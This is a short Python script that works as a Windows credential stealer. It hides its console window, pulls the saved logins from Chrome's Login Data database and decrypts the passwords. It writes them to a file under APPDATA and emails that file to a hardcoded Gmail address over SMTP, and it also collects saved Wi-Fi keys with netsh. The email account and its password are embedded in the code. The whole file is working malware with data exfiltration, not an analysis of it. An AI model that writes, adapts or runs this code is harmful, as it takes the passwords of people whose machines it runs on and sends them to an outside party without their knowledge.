import subprocess
from os import getenv
import os
import sqlite3
import win32crypt
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders




#Lets hide the console
import win32console, win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#Lets Connect to the Database
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()

#Lets get the results
cursor.execute('Select action_url, username_value, password_value FROM logins')
fp = open(getenv("APPDATA")+"\\123.txt", "a+")
fp.write("Chrome Saved Passwords\n")
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
    if password:
        fp.write('\nThe website is '+result[0])
        fp.write('\nThe Username is '+result[1])
        fp.write('\n The password is ' + str(password))
        

email_user = 'ak682015@gmail.com'
email_password = '8879562143'
email_send = 'ak682015@gmail.com'

subject = 'pypyyp'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Hi there, sending this email from Python!'
msg.attach(MIMEText(body,'plain'))

filename= getenv("APPDATA")+"\\123.txt"
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()


a = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
fp = open(getenv("APPDATA")+"\\123.txt", "a+")
fp.write("\n"+"WIFI SAVED PASSWORDS"+"\n")
for i in a:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        fp.write( ("{:<30}|  {:<}".format(i, results[0]+"\n")) )
    except IndexError:
        fp.write( ("{:<30}|  {:<}".format(i, "")+"\n") )



